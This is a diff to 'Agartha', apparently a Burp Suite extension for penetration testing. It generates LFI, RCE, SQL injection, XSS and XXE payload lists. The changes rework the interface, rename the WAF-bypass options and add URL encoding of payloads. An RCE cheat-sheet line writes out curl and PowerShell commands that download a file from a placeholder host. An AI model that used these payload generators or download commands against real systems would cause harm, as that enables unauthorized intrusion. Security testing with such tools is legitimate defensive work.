@@ -15,7 +15,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.49"
+VERSION = "0.50"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -366,7 +366,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         #panel center
 
         self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
-        self._tabAuthPanel.setBorder(EmptyBorder(20, 20, 20, 20))
+        self._tabAuthPanel.setBorder(EmptyBorder(10, 10, 10, 10))
         self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
         self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)
 
@@ -379,7 +379,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         #panel bottom
 
         self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)        
-        self._tabAuthSplitpane.setBorder(EmptyBorder(20, 20, 20, 20))        
+        #self._tabAuthSplitpane.setBorder(EmptyBorder(20, 20, 20, 20))        
         self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
         self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)
 
@@ -408,7 +408,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtCheatSheetRCE+="\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"       
         _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
         self._btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
-        self._lblStatusLabel = JLabel(" ", SwingConstants.LEFT)
+        self._lblStatusLabel = JLabel()
+        self._lblStatusLabel.setText("Please provide a path for payload generation!")
         self._txtDictParam = JTextField(self._txtDefaultLFI, 30)
         self._rbDictLFI = JRadioButton('DT/LFI', True, itemStateChanged=self.funcRBSelection);
         self._rbDictRCE = JRadioButton('RCE', itemStateChanged=self.funcRBSelection)
@@ -429,12 +430,16 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         _rbGroup.add(self._rbDictXXE)
         _rbGroup.add(self._rbDictXSS)
         _rbGroup.add(self._rbDictFuzzer)
-        self._cbDictEncoding= JCheckBox('Waf Bypass', True)
+        self._cbDictWafBypass= JCheckBox('Waf Bypass', True)
         self._cbDictEquality= JCheckBox(')', False)
         self._cbDictDepth = JComboBox(list(range(0, 20)))
         self._cbDictDepth.setSelectedIndex(10)
-        _cbDictDepthPanel = JPanel()
+        _cbDictDepthPanel = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
         _cbDictDepthPanel.add(self._cbDictDepth)
+        self._cbDictRCEEncoding= JCheckBox('URL Encoding', False)
+        self._cbDictRCEOpt = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
+        self._cbDictRCEOpt.add(self._cbDictRCEEncoding)
+        self._cbDictRCEOpt.setVisible(False)
         self._cbStackedSQL= JCheckBox('Stacked Queries', False)
         self._cbTimeBased= JCheckBox('Time-Based', True)
         self._cbUnionBased= JCheckBox('Union-Based', False)
@@ -448,9 +453,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._cbMysqlBased= JCheckBox('MYSQL', True)        
         self._cbPostgreBased= JCheckBox('POSTGRESQL', True)
         self._cbOracleBased= JCheckBox('ORACLE', True)
-        self._cbSqlEncoding= JCheckBox('Waf Bypass', True)
+        self._cbSqlWafBypass= JCheckBox('Waf Bypass', True)
+        self._cbSqlEncoding= JCheckBox('URL Encoding', False)
         _tabDictPanel_1 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
-        _tabDictPanel_1.setBorder(EmptyBorder(0, 0, 10, 0))
         _tabDictPanel_1.add(self._txtDictParam, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._btnGenerateDict, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(_rbPanel, BorderLayout.PAGE_START)
@@ -458,15 +463,18 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._tabDictPanel_LFI.add(_lblDepth, BorderLayout.PAGE_START)
         self._tabDictPanel_LFI.add(self._cbDictEquality, BorderLayout.PAGE_START)
         self._tabDictPanel_LFI.add(_cbDictDepthPanel, BorderLayout.PAGE_START)
-        self._tabDictPanel_LFI.add(self._cbDictEncoding, BorderLayout.PAGE_START)
+        self._tabDictPanel_LFI.add(self._cbDictWafBypass, BorderLayout.PAGE_START)
         self._tabDictPanel_LFI.setVisible(True)
         self._tabDictPanel_SQLType = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
         self._tabDictPanel_SQLType.add(self._cbMysqlBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLType.add(self._cbPostgreBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLType.add(self._cbMssqlBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLType.add(self._cbOracleBased, BorderLayout.PAGE_START)
-        self._tabDictPanel_SQLType.add(self._cbSqlEncoding, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLType.setVisible(False)
+        self._tabDictPanel_SQLOptions = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
+        self._tabDictPanel_SQLOptions.add(self._cbSqlEncoding, BorderLayout.PAGE_START)
+        self._tabDictPanel_SQLOptions.add(self._cbSqlWafBypass, BorderLayout.PAGE_START)        
+        self._tabDictPanel_SQLOptions.setVisible(False)
         self._tabDictPanel_SQLi = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
         self._tabDictPanel_SQLi.add(self._cbStackedSQL, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbTimeBased, BorderLayout.PAGE_START)
@@ -476,15 +484,17 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._tabDictPanel_SQLi.add(self._cbOrderDepth, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.add(self._cbBooleanBased, BorderLayout.PAGE_START)
         self._tabDictPanel_SQLi.setVisible(False)
-        _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)  
+        _tabDictPanel_1.add(self._tabDictPanel_LFI, BorderLayout.PAGE_START)
+        _tabDictPanel_1.add(self._cbDictRCEOpt, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._tabDictPanel_SQLType, BorderLayout.PAGE_START)
+        _tabDictPanel_1.add(self._tabDictPanel_SQLOptions, BorderLayout.PAGE_START)
         _tabDictPanel_1.add(self._tabDictPanel_SQLi, BorderLayout.PAGE_START)
         _tabDictPanel_1.setPreferredSize(Dimension(400,90))
         _tabDictPanel_1.setMinimumSize(Dimension(400,90))
         #top panel
 
         #center panel
-        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
+        _tabDictPanel_2 = JPanel(FlowLayout(FlowLayout.LEADING, 10, 0))
         _tabDictPanel_2.add(self._lblStatusLabel)
         #center panel
         
@@ -522,7 +532,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._lblStatusLabel.setForeground (Color.black)
         self._txtDictParam.text = self._txtDictParam.text.strip()
         self._tabDictResultDisplay.setText("")
-        self._lblStatusLabel.setText('')
+        self._lblStatusLabel.setText("")
         if self._rbDictRCE.isSelected():
             self.funcRCE(self)
         if self._rbDictLFI.isSelected():
@@ -542,25 +552,29 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             return False
 
     def funcRBSelection(self, ev):
+        self._lblStatusLabel.setForeground (Color.black)
         self._lblStatusLabel.setText("")
         self._tabDictPanel_LFI.setVisible(False)
+        self._cbDictRCEOpt.setVisible(False)
         self._tabDictPanel_SQLType.setVisible(False)
         self._tabDictPanel_SQLi.setVisible(False)
+        self._tabDictPanel_SQLOptions.setVisible(False)
         if self._rbDictLFI.isSelected():
             self._txtDictParam.setText(self._txtDefaultLFI)
             self._tabDictResultDisplay.setText(self._txtCheatSheetLFI)
             self._tabDictPanel_LFI.setVisible(True)
+            self._lblStatusLabel.setText("Please provide a path to generate payloads!")
         elif self._rbDictRCE.isSelected():
             self._txtDictParam.setText(self._txtDefaultRCE)
             self._tabDictResultDisplay.setText(self._txtCheatSheetRCE)
+            self._cbDictRCEOpt.setVisible(True)
+            self._lblStatusLabel.setText("Please provide a command to generate payloads!")
         elif self._rbDictSQLi.isSelected():
             self._txtDictParam.setText(self._txtDefaultSQLi)
             self._tabDictPanel_SQLType.setVisible(True)
             self._tabDictPanel_SQLi.setVisible(True)
+            self._tabDictPanel_SQLOptions.setVisible(True)
             self.funcSQLi(self)
-        elif self._rbDictCheatSheet.isSelected():
-            self._tabDictResultDisplay.setText(self._txtCheatSheet)
-            self._lblStatusLabel.setText('')
         return
 
     def funcRCE(self, ev):
@@ -584,6 +598,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                             
         listRCE = list(set(listRCE))
         listRCE.sort()
+        if self._cbDictRCEEncoding.isSelected():
+            listRCE = self.encodeURL(listRCE)
         self._tabDictResultDisplay.setText(''.join(map(str, listRCE)))
         self._lblStatusLabel.setText('Remote code dictionary: "' + self._txtDictParam.text + '", with '+ str(len(listRCE)) + ' result.')
         return
@@ -609,7 +625,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 i = i + 1
                 listLFI.append(_resultTxt + filePath + "\n")
 
-            if self._cbDictEncoding.isSelected():
+            if self._cbDictWafBypass.isSelected():
                 listLFI.append((_resultTxt + filePath).replace("..", "...") + "\n")
                 listLFI.append((_resultTxt + filePath).replace("..", "....") + "\n")
                 listLFI.append((_resultTxt + self._txtDictParam.text).replace("..", "...") + "\n")
@@ -689,7 +705,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         
         suffixes = ["", " -- ", "; -- "]
         
-        if not self._cbSqlEncoding.isSelected():
+        if not self._cbSqlWafBypass.isSelected():
             prefixes = [""]
             escapeChars = ["", "'"]
 
@@ -849,9 +865,17 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
         listSQLi = list(set(listSQLi))
         listSQLi.sort()
+        if self._cbSqlEncoding.isSelected():
+            listSQLi = self.encodeURL(listSQLi)
         self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
         self._lblStatusLabel.setText('SQLi payload generation is returned with '+ str(len(listSQLi)) + ' records!')
         return
+
+    def encodeURL(self, payloads):
+        urlList = []
+        for payload in payloads:
+            urlList.append(payload.replace(" ", "%20").replace("'", "%27").replace("\"", "%22").replace("\\", "%5c").replace("=", "%3d").replace("<", "%3c").replace(";", "%3b").replace("|", "%7c").replace("&", "%26").replace(":", "%3a").replace("`", "%60").replace(":", "%3a").replace("#", "%23"))
+        return urlList
 
     def getTabCaption(self):
         return "Agartha"
